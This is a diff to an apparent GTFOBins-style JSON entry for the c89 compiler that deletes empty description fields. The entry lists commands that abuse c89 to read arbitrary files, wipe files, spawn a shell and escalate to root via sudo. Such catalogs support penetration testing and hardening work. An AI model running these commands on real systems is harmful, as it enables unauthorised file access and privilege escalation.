@@ -2,25 +2,25 @@
   "functions": {
     "file-read": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_read\nc89 -x c -E \"$LFILE\"\n"
       }
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE\n"
       }
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "c89 -wrapper /bin/sh,-s .\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo c89 -wrapper /bin/sh,-s .\n"
       }
     ]
